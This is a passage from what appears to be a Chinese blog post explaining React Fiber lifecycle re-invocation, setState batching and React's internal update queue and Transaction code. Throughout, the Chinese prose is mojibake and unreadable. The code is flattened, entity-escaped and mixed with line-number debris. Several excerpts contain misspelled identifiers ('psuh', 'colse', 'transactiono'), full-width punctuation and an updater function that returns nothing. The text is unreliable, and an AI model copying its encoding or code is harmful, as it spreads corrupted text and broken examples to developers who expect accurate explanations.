å°±åŽ»æ‰§è¡Œè¿™ä¸ªç´§æ€¥ä»»åŠ¡Bã€‚ä»»åŠ¡A è™½ç„¶æ‰§è¡Œäº†ä¸€åŠï¼Œä½†æ˜¯æ²¡æœ‰åŠžæ³•ï¼Œåªèƒ½å®Œå…¨æ”¾å¼ƒï¼Œç­‰åˆ°ä»»åŠ¡B å®ŒæˆåŽï¼Œä»»åŠ¡ A é‡å¤´æ¥ä¸€éï¼Œä¹Ÿå°±æ˜¯è¯´ componentWillUpdateå‡½æ•°ä¼šè¢«å†é‡æ–°è°ƒç”¨ä¸€æ¬¡ã€‚ åœ¨çŽ°æœ‰çš„ React ä¸­ï¼Œæ¯ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°åœ¨ä¸€ä¸ªåŠ è½½æˆ–è€…æ›´æ–°è¿‡ç¨‹ä¸­å†³å®šåªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨ React Fiber ä¸­ï¼Œä¸å†æ˜¯è¿™æ ·äº†ï¼Œç¬¬ä¸€é˜¶æ®µçš„å£°ç”Ÿå‘½å‘¨æœŸå‡½æ•°åœ¨ä¸€æ¬¡åŠ è½½å’Œæ›´æ–°è¿‡ç¨‹ä¸­å¯èƒ½ä¼šè¢«å¤šæ¬¡è°ƒç”¨ã€‚ ä½¿ç”¨ React Fiber ä¹‹åŽï¼Œä¸€å®šè¦æ£€æŸ¥ä¸€ä¸‹ç¬¬ä¸€é˜¶æ®µç›¸å…³çš„è¿™äº›ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰é€»è¾‘æ˜¯å‡è®¾åœ¨ä¸€ä¸ªæ›´æ–°è¿‡ç¨‹ä¸­åªè°ƒç”¨ä¸€æ¬¡çš„ï¼Œæœ‰çš„è¯å°±è¦æ”¹äº†ã€‚ çœ‹çœ‹å¯èƒ½ä¼šé‡å¤è°ƒç”¨çš„å‡½æ•° componentWillReceivePropså³ä½¿å½“å‰ç»„ä»¶ä¸æ›´æ–°ï¼Œåªè¦çˆ¶ç»„ä»¶æ›´æ–°ä¹Ÿä¼šå¼•èµ·å’Œè¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨å¤šæ¬¡ï¼Œè°ƒç”¨å¤šæ¬¡æ— å¦¨ shouldComponentUpdateè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›žä¸€ä¸ª true æˆ–è€… falseï¼Œä¸åº”è¯¥æœ‰ä»»ä½•å‰¯ä½œç”¨ï¼Œè°ƒç”¨å¤šæ¬¡æ— å¦¨ render æ˜¯çº¯å‡½æ•°ï¼Œè°ƒç”¨å¤šæ¬¡æ— å¦¨ å‰©ä¸‹ componentWillMount å’Œ componentWillUpdateè¿™ä¸¤ä¸ªå‡½æ•°å¾€å¾€åŒ…å«å‰¯ä½œç”¨ï¼Œæ‰€ä»¥å½“ä½¿ç”¨ React Fiber çš„æ—¶å€™ä¸€å®šè¦é‡ç‚¹çœ‹è¿™ä¸¤ä¸ªå‡½æ•°çš„å®žçŽ°ã€‚ this.setState å¼‚æ­¥åŽŸå› ä»¥åŠæ›´æ–°æœºåˆ¶çŽ°è±¡åœ¨ React ä¸­ï¼Œå¦‚æžœæ˜¯ç”± React å¼•å‘çš„äº‹ä»¶å¤„ç†ï¼ˆæ¯”å¦‚é€šè¿‡ onClick å¼•å‘çš„åˆæˆäº‹ä»¶å¤„ç†ï¼‰å’Œç»„ä»¶ç”Ÿå‘½å‘¨æœŸå‡½æ•°å†…ï¼ˆæ¯”å¦‚ componentDidMountï¼‰ï¼Œè°ƒç”¨ this.setState ä¸ä¼šåŒæ­¥æ›´æ–° this.stateï¼Œé™¤æ­¤ä¹‹å¤–çš„ setState è°ƒç”¨ä¼šåŒæ­¥æ‰§è¡Œ this.stateã€‚é™¤æ­¤ä¹‹å¤–æŒ‡çš„æ˜¯ç»•è¿‡ React é€šè¿‡ addEventListener ç›´æŽ¥æ·»åŠ çš„äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œè¿˜æœ‰é€šè¿‡ setTimeout/setInterval äº§ç”Ÿçš„å¼‚æ­¥è°ƒç”¨ã€‚å¦å¤–åœ¨åˆæˆäº‹ä»¶å’Œç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸­çš„å¼‚æ­¥è°ƒç”¨ setStateï¼ˆæ¯”å¦‚ ajax å’Œ setTimeoutï¼‰ ä¹Ÿæ˜¯ä¼šåŒæ­¥æ›´æ–° this.setState ä¿è¯å†…éƒ¨ï¼ˆæ•°æ®ï¼‰çš„ç»Ÿä¸€å‡è®¾ setState æ˜¯åŒæ­¥çš„ï¼š 123456console.log(this.state.value); //0this.setState(&#123;value:this.state.value + 1&#125;)console.log(this.state.value); //1this.setState(&#123;value:this.state.value + 1&#125;)console.log(this.state.value); //2this.setState(&#123;value:this.state.value + 1&#125;) è¿™ç§åªç”¨åˆ°äº† state çš„æƒ…å†µä¸‹ï¼ŒåŒæ­¥ setState æ˜¯å¯ä»¥çš„ã€‚ ç„¶è€Œè¿™æ—¶éœ€è¦å°†çŠ¶æ€æå‡åˆ°çˆ¶ç»„ä»¶ï¼Œä»¥ä¾›å¤šä¸ªå…„å¼Ÿç»„ä»¶å…±äº«ï¼š 123456console.log(this.props.value) // 0this.props.onIncrement();console.log(this.props.value) // 0this.props.onIncrement();console.log(this.props.value) // 0this.props.onIncrement(); åœ¨åŒæ­¥æ¨¡åž‹ä¸­ï¼Œè™½ç„¶ this.state ä¼šç«‹å³æ›´æ–°ï¼Œä½†æ˜¯ this.props å¹¶ä¸ä¼šã€‚è€Œä¸”åœ¨æ²¡æœ‰é‡æ¸²æŸ“çˆ¶ç»„ä»¶çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸èƒ½ç«‹å³æ›´æ–° this.propsã€‚å¦‚æžœè¦ç«‹å³æ›´æ–° this.props(ç«‹å³é‡æ–°æ¸²æŸ“çˆ¶ç»„ä»¶)ï¼Œå¿…é¡»æ”¾å¼ƒæ‰¹å¤„ç†ï¼ˆæ ¹æ®ä¸åŒçš„æƒ…å†µï¼Œæ€§èƒ½å¯èƒ½æœ‰æ˜¾è‘—ä¸‹é™ï¼‰ æ‰€ä»¥ä¸ºäº†è§£å†³è¿™æ ·çš„é—®é¢˜ï¼Œåœ¨ React ä¸­ï¼Œthis.state å’Œ this.props éƒ½æ˜¯å¼‚æ­¥æ›´æ–°çš„ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­é‡æž„å‰åŽéƒ½ä¼šæ‰“å°å‡º0ï¼Œè¿™è®©çŠ¶æ€æå‡æ›´åŠ å®‰å…¨ã€‚ æ€§èƒ½ä¼˜åŒ–æˆ‘ä»¬é€šå¸¸è®¤ä¸ºçŠ¶æ€æ›´æ–°ä¼šæŒ‰ç…§æ—¢å®šé¡ºåºè¢«åº”ç”¨ï¼Œæ— è®º state æ˜¯åŒæ­¥æ›´æ–°è¿˜æ˜¯å¼‚æ­¥æ›´æ–°ï¼Œç„¶è€Œäº‹å®žå¹¶ä¸ä¸€å®šå¦‚æ­¤ã€‚ React ä¼šä¾æ®ä¸åŒçš„è°ƒç”¨æºï¼Œç»™ä¸åŒçš„ setState è°ƒç”¨åˆ†é…ä¸åŒçš„ä¼˜å…ˆçº§ã€‚è°ƒç”¨æºåŒ…æ‹¬äº‹ä»¶å¤„ç†ã€ç½‘ç»œè¯·æ±‚ã€åŠ¨ç”»ç­‰ã€‚ åŸºæœ¬ç”¨æ³•1234567// ç”¨æ³•1this.setState(&#123;&#125;,()=&gt;&#123;&#125;)// ç”¨æ³•2this.setState(()=(&#123;&#125;),()=&gt;&#123;&#125;)// å‚æ•°1ï¼šå¯¹è±¡ï¼Œkeyæ˜¯ this.state ä¸­keyå€¼ï¼Œval æ˜¯ä¿®æ”¹åŽçš„å€¼// å‚æ•°2ï¼šå‡½æ•°ï¼Œå¯æŸ¥çœ‹æ•°æ®æ˜¯å¦æ›´æ–°å®Œæˆï¼ŒèŽ·å–åˆ°æ•°æ®æ›´æ–°åŽçš„æœ€æ–° dom ç»“æž„ ä¸è¦ç›´æŽ¥ä¿®æ”¹ state 1this.state.comment = 'Hello' (X) state æ›´æ–°å¯èƒ½ä¼šå¼‚æ­¥ ä»Žä¸Šé¢ä¹ŸçŸ¥é“äº†ï¼ŒReact ä¸ºäº†æ€§èƒ½ä¼˜åŒ–ï¼Œæœ‰å¯èƒ½ä¼šå°†å¤šä¸ª setState è°ƒç”¨åˆå¹¶ä¸ºä¸€æ¬¡æ›´æ–°ï¼Œå› ä¸º this.props ä¸Ž this.state å¯èƒ½æ˜¯å¼‚æ­¥æ›´æ–°çš„ï¼Œä½ ä¸å¯èƒ½ä¾èµ–ä»–ä»¬çš„å€¼è¿›è¡Œä¸‹ä¸€ä¸ª state çš„è®¡ç®— 1this.setState(&#123;counter:this.state.counter + this.props.increment&#125;) (X) ä¸ºäº†å¼¥è¡¥è¿™ä¸ªé—®é¢˜ï¼Œä½¿ç”¨äº†å¦ä¸€ç§ setState å½¢å¼ï¼ŒæŽ¥å—ä¸€ä¸ªå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°æŽ¥æ”¶å‰ä¸€ä¸ªçŠ¶æ€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œåº”ç”¨æ›´æ–°æ—¶çš„ props ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š 123this.setState((prevState,props)=&gt;&#123; counter:prevState.counter + props.increment&#125;) å¤šæ¬¡setStateå‡½æ•°è°ƒç”¨äº§ç”Ÿçš„æ•ˆæžœä¼šåˆå¹¶ å½“è°ƒç”¨ setState ,React ä¼šåˆå¹¶ä½ æä¾›çš„å¯¹è±¡åˆ°å½“å‰çš„çŠ¶æ€ã€‚æ‰€ä»¥å½“ state æ˜¯ä¸€ä¸ªå¤šé”®å€¼çš„ç»“æž„ï¼Œå¯ä»¥å•ç‹¬æ›´æ–°å…¶ä¸­ä¸€ä¸ªï¼Œæ­¤æ—¶ä¼š å·®åˆ† æ›´æ–°ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–çš„å±žæ€§å€¼ æ€»ç»“èµ·æ¥å°±æ˜¯ï¼š setState ä¸ä¼šç«‹åˆ»æ”¹å˜ React ç»„ä»¶ä¸­çš„ state setState é€šè¿‡è§¦å‘ä¸€æ¬¡ç»„ä»¶çš„æ›´æ–°æ¥å¼•å‘é‡ç»˜ å¤šæ¬¡ setState å‡½æ•°å—²ç”¨äº§ç”Ÿçš„æ•ˆæžœä¼šåˆå¹¶ é‡ç»˜æŒ‡çš„æ›´æ–°çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼š shouldComponentUpdate:è¢«è°ƒç”¨æ—¶ this.state æ²¡æœ‰æ›´æ–°ï¼Œå¦‚æžœè¿”å›ž falseï¼Œç”Ÿå‘½å‘¨æœŸè¢«ä¸­æ–­ï¼Œè™½ç„¶ä¸è°ƒç”¨ä¹‹åŽçš„å‡½æ•°ï¼Œä½†æ˜¯ state ä»ç„¶ä¼šè¢«æ›´æ–° componentWillUpdateï¼šè¢«è°ƒç”¨æ—¶ this.state æ²¡æœ‰æ›´æ–° renderï¼šè¢«è°ƒç”¨æ—¶ this.state å¾—åˆ°æ›´æ–° componentDidUpdate Reactä¼šå°†setStateçš„æ•ˆæžœæ”¾åœ¨é˜Ÿåˆ—ä¸­ï¼Œç§¯æ”’ç€ä¸€æ¬¡å¼•å‘æ›´æ–°è¿‡ç¨‹ã€‚ä¸ºçš„å°±æ˜¯æŠŠVirtual DOMå’ŒDOMæ ‘æ“ä½œé™åˆ°æœ€å°ï¼Œç”¨äºŽæé«˜æ€§èƒ½ã€‚ æ‰§è¡ŒsetState åŽæ‹¿åˆ°æœ€æ–°çš„ state 12345678updateData = (newData)=&gt;&#123; this.setState( &#123;data:newData&#125;, () =&gt;&#123; console.log(this.state.data) &#125; )&#125; setState æ›´æ–°æœºåˆ¶å¾ªçŽ¯è°ƒç”¨é£Žé™© ä¸è¦åœ¨ shouldComponentUpdateå’Œ componentWillUpdateä¸­è°ƒç”¨ setStateï¼Œä¸ç„¶ä¼šå‡ºçŽ°æ­»å¾ªçŽ¯ åœ¨è°ƒç”¨ setStateæ—¶å€™å®žé™…ä¸Šä¼šæ‰§è¡Œ enqueueSetStateæ–¹æ³•ï¼Œå¹¶å¯¹ partialStateã€pendingStateQueueæ›´æ–°é˜Ÿåˆ—è¿›è¡Œåˆå¹¶æ“ä½œï¼Œæœ€ç»ˆé€šè¿‡ enqueueUpdateæ‰§è¡Œ state æ›´æ–°ã€‚ è€Œ performUpdateIfNecessaryæ–¹æ³•ä¼šèŽ·å– pendingElementã€pendingStateQueueã€pendingForceUpdateå¹¶è°ƒç”¨ receiveComponentå’Œ updateComponentæ–¹æ³•è¿›è¡Œç»„ä»¶æ›´æ–° å¦‚æžœåœ¨ componentWillUpdate å’Œ shouldComponentUpdate ä¸­è°ƒç”¨ setStateï¼Œæ­¤æ—¶ pendingStateQueue !== nullåˆ™ performUpdateIfNessary ä¼šè°ƒç”¨ updateComponent è¿›è¡Œç»„ä»¶æ›´æ–°ï¼Œè€Œ updateComponentåˆä¼šè°ƒç”¨ shouldComponentUpdate å’Œ componentWillUpdateè¿™æ ·å°±å¯¼è‡´äº†å¾ªçŽ¯è°ƒç”¨ setState æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445// React ç»„ä»¶ç»§æ‰¿è‡ª React.Componentï¼Œè€Œ SetState æ˜¯ React.Component çš„æ–¹æ³•ï¼Œå¯¹äºŽç»„ä»¶æ¥è¯´ï¼ŒsetState å±žäºŽå…¶åŽŸåž‹æ–¹æ³•// åœ¨ React ä¸­æ¯ä¸ªç»„ä»¶éƒ½æ‹¥æœ‰ä¸€ä¸ª this.updaterï¼Œæ˜¯ç”¨æ¥é©±åŠ¨ state æ›´æ–°çš„å·¥å…·å¯¹è±¡ã€‚å½“æˆ‘ä»¬åœ¨æž„é€ å‡½æ•°ä¸­è°ƒç”¨ super çš„æ—¶å®žè´¨è°ƒç”¨çš„å°±æ˜¯å‡½æ•° ReactComponentfunction ReactComponent(props,context,updater)&#123; this.props = props; this.context = context; this.refs = emptyObject; // ReactNoopUpdateQueue å®žé™…æ˜¯æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰çš„ï¼Œåªç›¸å½“äºŽæ˜¯ä¸€ä¸ªåˆå§‹åŒ–çš„è¿‡ç¨‹ã€‚è€Œ ReactNoopUpdateQueue.enqueueSetState ä¸»è¦èµ·åˆ°ä¸€ä¸ªåœ¨éžç”Ÿäº§ç‰ˆæœ¬ä¸­è­¦å‘Šçš„ä½œç”¨ã€‚çœŸæ­£çš„ updater æ˜¯åœ¨ renderer ä¸­æ³¨å…¥ï¼ˆinjectï¼‰ã€‚å› æ­¤å¦‚æžœåœ¨ constructor å°è¯•è°ƒç”¨ this.helper.isMountä¼šè¿”å›ž falseï¼Œè¡¨ç¤ºå¹¶æ²¡æœ‰å®‰è£…ï¼ˆmountï¼‰ï¼Œå¦‚æžœä½ è°ƒç”¨ setStateï¼Œä¹Ÿä¼šç»™å‡ºå“åº”çš„è­¦å‘Š this.updater = updater || ReactNoopUpdateQueue;&#125;ReactComponent.prototype.setState = function(partialState,callback)&#123; // è°ƒç”¨ enqueueSetState å°† setState äº‹åŠ¡æ”¾è¿›é˜Ÿåˆ—ä¸­ // partialState å¯ä»¥ä¼  Object,ä¹Ÿå¯ä»¥ä¼  function,ä¼šäº§ç”Ÿæ–°çš„ state ä»¥ä¸€ç§ Object.assign() çš„æ–¹å¼è·Ÿæ—§çš„ state è¿›è¡Œåˆå¹¶ // å‚æ•° this æ˜¯ç»„ä»¶çš„å®žä¾‹ this.updater.enqueueSetState(this,partialState); if(callback)&#123; this.updater.enqueueCallback(this,callback,'setState') &#125;&#125;var ReactUpdateQueue = &#123; // å®žé™…é€šè¿‡ enqueueSetState æ‰§è¡Œ // 1.å°†æ–°çš„ state æ”¾è¿›æ•°ç»„ // 2.ç”¨ enqueueUpdate æ¥å¤„ç†å°†è¦æ›´æ–°çš„å®žä¾‹å¯¹è±¡ enqueueSetStateï¼šfunction(publicInstance,partialState)&#123; // èŽ·å–å½“å‰ç»„ä»¶çš„ instanceï¼Œé‡Œé¢æœ‰å¾ˆå¤šå±žæ€§ï¼Œä¸»è¦å…³æ³¨ pendingState(å¾…æ›´æ–°é˜Ÿåˆ—)ï¼ŒpendingCallbacks(æ›´æ–°å›žè°ƒé˜Ÿåˆ—) const internalInstance = getInernalInstanceReadyForUpdate( publickInstance, 'setState' ) if(!inernalInstance) return // æ›´æ–°é˜Ÿåˆ—åˆå¹¶æ“ä½œ const queue = internalInstance._pendingStateQueue || ï¼ˆinternalInstance._pendingStateQueue = []ï¼‰ // partialState å¯ä»¥ç†è§£ä¸ºä¹‹å‰çš„ state queue.push(partialState) // æœ€ç»ˆé€šè¿‡ enqueueUpdate æ›´æ–°ï¼Œå°†æ–°çš„ component instance æ”¾å…¥ä¸€ä¸ªé˜Ÿåˆ— enqueueUpdate(internalInstance) &#125; // å¦‚æžœå­˜åœ¨ _pendingElementã€_pendingStateQueue å’Œ _pendingForceUpdate åˆ™æ›´æ–°ç»„ä»¶ performUpdateIfNessary:function(transaction)&#123; if(this._pendingElement != null)&#123; ReactReconciler.receiveComponent(this,this._pendingElement,transaction,this._context) &#125; if(this._pendingStateQueue !== null || this._pendingForceUpdate)&#123; this.updateComponent(transaction,this._currentElement,this._currentElement,this._context) &#125; &#125; &#125; setState è°ƒç”¨æ ˆ graph TD A[this.setState] B[newStateå­˜å…¥pendingé˜Ÿåˆ—] C{æ˜¯å¦å¤„äºŽ batch update} D(ä¿å­˜ç»„ä»¶åœ¨ dirtyComponentä¸­) E(éåŽ†æ‰€æœ‰çš„dirtyComponents è°ƒç”¨updateComponent æ›´æ–° pending state or props) F[è°ƒç”¨enqueueUpdate] A --> B B --> F F --> C C == Y ==> D C == N ==> E Reactçš„setStateå‡½æ•°å®žçŽ°ä¸­ï¼Œä¼šæ ¹æ®ä¸€ä¸ªå˜é‡ isBatchingUpdates åˆ¤æ–­æ˜¯ ç›´æŽ¥æ›´æ–° this.stateè¿˜æ˜¯ æ”¾åˆ°é˜Ÿåˆ— ä¸­ã€‚ isBatchingUpdatesé»˜è®¤falseï¼Œè¡¨ç¤ºsetStateä¼šåŒæ­¥æ›´æ–°this.stateï¼Œä½†æ˜¯å‡½æ•°batchedUpdateså‡½æ•°ä¼šæŠŠisBatchingUpdatesä¿®æ”¹ä¸ºtrueã€‚å½“Reactåœ¨è°ƒç”¨äº‹ä»¶å¤„ç†å‡½æ•°ä¹‹å‰å°±ä¼šè°ƒç”¨batchedUpdatesï¼Œé€ æˆçš„åŽæžœï¼Œå°±æ˜¯ç”±ReactæŽ§åˆ¶çš„äº‹ä»¶å¤„ç†è¿‡ç¨‹setStateä¸ä¼šåŒæ­¥æ›´æ–°this.stateã€‚ 12345678910111213141516171819202122232425262728293031function enqueueUpdate(internalInstance)&#123; ReactUpdates.enqueueUpdate(internalInstance)&#125;const ReactUpdates = &#123; enqueueUpdate:function enqueueUpdate(component)&#123; // ä¿è¯ ReactUpdates.ReactReconcileTransaction ä¸Ž batchingStrategy æ˜¯å­˜åœ¨çš„ï¼Œå¦åˆ™ç»™å‡ºå¯¹åº”çš„è­¦å‘Š ensureInjected(); // å¦‚æžœä¸å¤„äºŽæ‰¹é‡æ›´æ–°æ¨¡å¼ if(!batchingStrategy.isBatchingUpdates)&#123; // è°ƒç”¨äº‹åŠ¡ batchingStrategy.batchedUpdates(enqueueUpdate,component) return &#125; // å¦‚æžœå¤„äºŽæ‰¹é‡æ›´æ–°æ¨¡å¼,å°†ç»„ä»¶æ”¾å…¥è„ç»„ä»¶é˜Ÿåˆ—ï¼Œä¹Ÿå°±æ˜¯å¾…æ›´æ–°ç»„ä»¶é˜Ÿåˆ— dirtyComponents.psuh(component); &#125;&#125;// batchingStrategyã€‚å®žè´¨ä¸Šæ˜¯ä¸€ç§æ‰¹é‡æ›´æ–°ç­–ç•¥const ReactDefaultBatchingStrategy = &#123; isBatchingupdates:false, batchedUpdates:function(callback,a,b,c,d,e)&#123; const alreadyBatchingUpdates = ReactDefaultBatchingStrategy.isBatchingUpdates ReactDefaultBatchingStrategy.isBatchingUpdates = true if(callback)&#123; callback(a,b,c,d,e) &#125;else&#123; transaction.perform(callback,null,a,b,c,d,e) &#125; &#125;&#125; Transaction å…³äºŽ React ä¸­çš„äº‹åŠ¡ Transaction,æºç ä¸­æœ‰è¿™æ ·çš„ ASCIIå›¾ 1234567891011121314151617181920212223242526/** * &lt;pre&gt; * wrappers (injected at creation time) * + + * | | * +-----------------|--------|--------------+ * | v | | * | +---------------+ | | * | +--| wrapper1 |---|----+ | * | | +---------------+ v | | * | | +-------------+ | | * | | +----| wrapper2 |--------+ | * | | | +-------------+ | | | * | | | | | | * | v v v v | wrapper * | +---+ +---+ +---------+ +---+ +---+ | invariants * perform(anyMethod) | | | | | | | | | | | | maintained * +-----------------&gt;|-|---|-|---|--&gt;|anyMethod|---|---|-|---|-|--------&gt; * | | | | | | | | | | | | * | | | | | | | | | | | | * | | | | | | | | | | | | * | +---+ +---+ +---------+ +---+ +---+ | * | initialize close | * +-----------------------------------------+ * &lt;/pre&gt; */ React ä¸­çš„äº‹åŠ¡ Transactionï¼Œä¼šç»™æ–¹æ³•åŒ…è£…ä¸€ä¸ªä¸ª wrapperï¼Œå…¶ä¸­æ¯ä¸ª wrapper éƒ½æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼šinitialize ä¸Ž closeã€‚å½“æ‰§è¡Œæ–¹æ³•æ—¶ï¼Œéœ€è¦æ‰§è¡Œäº‹åŠ¡çš„ perform æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•ä¼šé¦–å…ˆä¸€æ¬¡æ‰§è¡Œ wrapper çš„ initialize,ç„¶åŽæ‰§è¡Œå‡½æ•°æœ¬èº«ï¼Œæœ€åŽæ‰§è¡Œ wrapper çš„ close æ–¹æ³• å®šä¹‰ Transaction éœ€è¦ç»™æž„é€ å‡½æ•°æ··å…¥ Transaction.Mixinï¼Œå¹¶éœ€è¦æä¾›ä¸€ä¸ªåŽŸåž‹æ–¹æ³• getTransactionWrappers ç”¨äºŽè¿”å›ž wrapper æ•°ç»„ã€‚ 123456789101112131415161718192021222324var RESET_BATCHED_UPDATES = &#123; initialize:emptyFuntion, colse:function()&#123; // é‡ç½®ä¸º false ReactDefaultBatchingStrategy.isBatchingUpdates = false; &#125;&#125;var FLUSH_BATCHED_UPPDATES = &#123; initialize:emptyFunction, close:ReactUpdates.flushBatchedUpdates.bind(ReactUpdates)&#125;var TRANSACTION_WRAPPERS = [FLUSH_BATCHED_UPDATES,RESET_BATCHED_UPDATES]ï¼›function ReactDefaultBatchingStrategyTransaction()&#123; this.reinitializeTransaction();&#125;Object.assign( ReactDefaultBatchingStrategyTransaction.prototype, Transaction.Mixin,&#123; getTransactionWrappers:function()&#123; return TRANSACTION_WRAPPERS; &#125; &#125;)var transaction = new ReactDefaultBatchingStrategyTransaction(); é‡æ–°å›žé¡¾ä¸€ä¸‹æ›´æ–°çš„è¿‡ç¨‹ï¼Œå¦‚æžœå¤„äºŽæ‰¹é‡æ›´æ–°çš„è¿‡ç¨‹ä¸­ï¼ˆisBatchingUpdatesä¸º trueï¼‰çš„æ—¶å€™ï¼Œåˆ™ç›´æŽ¥å°†ç»„ä»¶ä¼ å…¥ dirtyComponentsã€‚å¦‚æžœä¸æ˜¯çš„è¯ï¼Œå°±å¼€å¯æ‰¹é‡æ›´æ–°ï¼Œç”¨äº‹åŠ¡ transaction.performæ‰§è¡Œ enqueueUpdateï¼Œè¿™æ—¶å€™ isBatchingUpdatesç»è¿‡ä¸Šæ¬¡æ‰§è¡Œå·²ç»æ˜¯ trueï¼Œå°†ç›´æŽ¥ä¼ å…¥ dirtyComponentsã€‚é‚£ä¹ˆæ›´æ–°çš„ç»„ä»¶ä¼ å…¥ dirtyComponentä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ batchUpdatesæ˜¯å¤„äºŽä¸€ä¸ªäº‹åŠ¡ä¸­çš„ï¼Œè¯¥äº‹åŠ¡åœ¨ close é˜¶æ®µåšäº†ä¸¤ä»¶äº‹ï¼Œé¦–å…ˆæ˜¯å°† ReactDefaultBatchingStrategy.isBatchingUpdatesè®¾ç½®ä¸º falseï¼Œå³å…³é—­æ‰¹é‡æ›´æ–°çš„æ ‡å¿—ä½ï¼Œç¬¬äºŒä¸ªå°±æ˜¯è°ƒç”¨æ–¹æ³• ReactUpdates.flushBatchedUpdatesã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137// ä»£ç æœ‰çœç•¥var flushBatchedUpdates = function()&#123; while(dirtyComponents.length)&#123; if(dirtyComponents.length)&#123; var transaction = ReactUpdatesFlushTransaction.getPooled(); // ä»¥äº‹åŠ¡çš„æ–¹å¼æ‰§è¡Œäº† runBatchedUpdates transaction.perform(runBatchedUpdates,null,transaction); ReactUpdatesFlushTransaction.release(transaction) &#125; &#125;&#125;function runBatchedUpdates(transaction)&#123; var len = transactiono.dirtyComponentsLength; // å°†ç»„ä»¶ä¸­çš„ mountOrder è¿›è¡Œäº†é€’å¢žæŽ’åºï¼Œç›®çš„å°±æ˜¯ä¿è¯æ›´æ–°é¡ºåºï¼Œçˆ¶ç»„ä»¶ä¿è¯å…¶å­ç»„ä»¶ä¹‹å‰æ›´æ–°ã€‚ dirtyComponents.sort(mountOrderComparator); for(var i=0;i&lt;len;i++)&#123; // åœ¨ç»„ä»¶ä¸­èŽ·å¾— setState å®Œæˆä¹‹åŽçš„å›žè°ƒå‡½æ•° var component = dirtyComponents[i]; var callbacks = component._pendingCallbacks; component._pendingCallbacks = null; // ... ReactReconciler.performUpdateIfNessary(component,transaction.reconcileTransaction) // ... if(callbacks)&#123; for(var j=0;j&lt;callbacks.length;j++)&#123; transaction.callbackQueue.enqueue( callbacks[j], component.getPublickInstance() ) &#125; &#125; &#125;&#125;// performUpdateIfNessary æ‰§è¡Œç»„ä»¶å®žä¾‹çš„åŽŸåž‹æ–¹æ³•performUpdateIfNecessaryperformUpdateIfNessary:function(internalInstance,transaction)&#123; interbalInstance.performUpdateIfNecessary(transaction)&#125;// çœç•¥ç‰ˆæœ¬var ReactCompositeComponentMixin = &#123; performUpdateIfNecessary:function(transaction)&#123; if(this._pendingStateQueue !==null || this._pendingForceUpdate)&#123; this.updateComponent( transaction, this._currentElement, this._currentElement, this._context, this._context ) &#125; &#125;&#125;updateComponent: function( transaction, prevParentElement, nextParentElement, prevUnmaskedContext, nextUnmaskedContext ) &#123; var inst = this._instance; var willReceive = false; var nextContext; var nextProps; // éªŒè¯ç»„ä»¶contextæ˜¯å¦æ”¹å˜ // ...... // éªŒè¯æ˜¯å¦æ˜¯propsæ›´æ–°è¿˜æ˜¯ç»„ä»¶stateæ›´æ–° if (prevParentElement === nextParentElement) &#123; nextProps = nextParentElement.props; &#125; else &#123; //å­˜åœ¨propsçš„æ›´æ–° nextProps = this._processProps(nextParentElement.props); willReceive = true; &#125; //æ ¹æ®æ¡ä»¶åˆ¤æ–­æ˜¯å¦è°ƒç”¨é’©å­å‡½æ•°componentWillReceiveProps if (willReceive &amp;&amp; inst.componentWillReceiveProps) &#123; inst.componentWillReceiveProps(nextProps, nextContext); &#125; //è®¡ç®—æ–°çš„state var nextState = this._processPendingState(nextProps, nextContext); var shouldUpdate = this._pendingForceUpdate || !inst.shouldComponentUpdate || inst.shouldComponentUpdate(nextProps, nextState, nextContext); if (shouldUpdate) &#123; this._pendingForceUpdate = false; this._performComponentUpdate( nextParentElement, nextProps, nextState, nextContext, transaction, nextUnmaskedContext ); &#125; else &#123; this._currentElement = nextParentElement; this._context = nextUnmaskedContext; inst.props = nextProps; inst.state = nextState; inst.context = nextContext; &#125; &#125;// è®¡ç®—æ–°çš„ state é‡Œé¢è°ƒç”¨äº† _processPending&#123; _processPendingState: function(props, context) &#123; var inst = this._instance; var queue = this._pendingStateQueue; var replace = this._pendingReplaceState; this._pendingReplaceState = false; this._pendingStateQueue = null; if (!queue) &#123; return inst.state; &#125; if (replace &amp;&amp; queue.length === 1) &#123; return queue[0]; &#125; var nextState = Object.assign(&#123;&#125;, replace ? queue[0] : inst.state); for (var i = replace ? 1 : 0; i &lt; queue.length; i++) &#123; var partial = queue[i]; Object.assign( nextState, typeof partial === 'function' ? partial.call(inst, nextState, props, context) : partial ); &#125; return nextState; &#125;&#125; è¿™ä¸€éƒ¨åˆ†ä»£ç ç›¸å¯¹æ¥è¯´ä¸ç®—æ˜¯å¾ˆéš¾ï¼Œreplaceæ˜¯å­˜åœ¨æ˜¯ç”±äºŽä¹‹å‰è¢«åºŸå¼ƒçš„APIthis.replaceStateï¼Œæˆ‘ä»¬çŽ°åœ¨ä¸éœ€è¦å…³å¿ƒè¿™ä¸€éƒ¨åˆ†ï¼ŒçŽ°åœ¨æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸ºä»€ä¹ˆç»™ setState ä¼ å…¥çš„å‚æ•°æ˜¯å‡½æ•°æ—¶ï¼Œå°±å¯ä»¥è§£å†³ setState çš„æ½œåœ¨é—®é¢˜ã€‚ 12this.setState(&#123;value:this.state.value + 1&#125;)this.setState(&#123;value:this.state.value + 1&#125;) è°ƒç”¨ 